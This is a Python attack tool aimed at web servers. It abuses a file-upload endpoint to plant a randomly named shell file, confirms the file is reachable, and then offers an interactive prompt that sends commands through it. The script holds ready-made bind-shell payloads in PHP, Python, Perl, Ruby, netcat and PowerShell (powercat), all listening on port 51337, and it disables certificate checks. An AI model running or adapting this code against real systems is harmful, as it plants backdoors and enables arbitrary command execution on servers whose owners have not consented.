#!/usr/bin/python3.9
import requests
import sys
import argparse
import random
import string

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', action='store',
                    help='The URL of the target.')
parser.add_argument('-p', '--path', action='store', help='The path of payload')
parser.add_argument('-n', '--name', action='store', help='The name of payload')
parser.add_argument('-t', '--type', action='store',
                    help='The file type of payload')
args = parser.parse_args()

url = args.url.rstrip('/')
filepath = '/'+args.path.rstrip('/')+'/'
shell_name = args.name
extension = '.'+args.type

payload_php = '''
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",51337);\
socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
    socket_write($cl,$m,strlen($m));}}'
    '''

payload_python = '''import socket as s,subprocess as sp;

s1 = s.socket(s.AF_INET, s.SOCK_STREAM);
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);
s1.bind(("0.0.0.0", 51337));
s1.listen(1);
c, a = s1.accept();

while True:
    d = c.recv(1024).decode();
    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE);
    c.sendall(p.stdout.read()+p.stderr.read())'''

payload_perl = '''
perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
'''

payload_ruby = '''
ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
'''

payload_netcat = f'nc -nlvp 51337 -e /bin/bash'

payload_powershell = '''
https://github.com/besimorhino/powercat

# Victim (listen)
. .\powercat.ps1
powercat -l -p 7002 -ep

# Connect from attacker
. .\powercat.ps1
powercat -c 127.0.0.1 -p 7002
'''

while True:
    attack_cmd = str(input('> Try attack before connect (y/n): '))
    if attack_cmd.lower() == 'y' or attack_cmd.lower() == 'n':
        break
    else:
        print('Error: Invalid Input!')


if attack_cmd.lower() == 'y':
    endpoint = str(
        input('> Specify endpoint (hit enter if use target url directly)'))
    endpoint_upload = url+'/'+endpoint
    payload_type = str(
        input('> Specify payload: 1.Php 2.Python 3.Perl 4.Ruby 5.Netcat 6.Powershell'))
    if payload_type == '1':
        shell = payload_php
    elif payload_type == '2':
        shell = payload_python
    elif payload_type == '3':
        shell = payload_perl
    elif payload_type == '4':
        shell = payload_ruby
    elif payload_type == '5':
        shell = payload_netcat
    elif payload_type == '6':
        shell = payload_powershell
    else:
        print('Error: Invalid Input! Exiting...')
        sys.exit(1)
    shell_name = ''.join(random.choice(
        string.ascii_letters + string.digits) for i in range(10))
    file = {'file': (shell_name + extension, shell,
                     'text/{}'.format(extension))}
    print('> Attempting to attack...')
    r = requests.post(url + endpoint_upload, files=file,
                      data={'add': '1'}, verify=False)
    print('> Verifying shell upload...')
    r = requests.get(url + filepath + shell_name + extension,
                     params={'cmd': 'echo ' + shell_name}, verify=False)
    if shell_name in r.text:
        print('> Web shell uploaded to ' + url +
              filepath + shell_name + extension)
        print('> Example command usage: ' + url + filepath +
              shell_name + '{}?cmd=whoami'.format(extension))
        filepath = endpoint_upload
else:
    pass


while True:
    launch_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
    if launch_shell.lower() == 'y' or launch_shell.lower() == 'n':
        break
    else:
        print('Error: Invalid Input!')

if launch_shell.lower() == 'y':
    while True:
        cmd = str(input('Command> '))
        if cmd == 'exit':
            sys.exit(0)
        r = requests.get(url + filepath +
                         shell_name + extension, params={'cmd': cmd}, verify=False)
        print(r.text)

if launch_shell.lower() == 'n':
    print('Info: Shell closed by user, exiting in 1 second...')
    sys.exit(0)
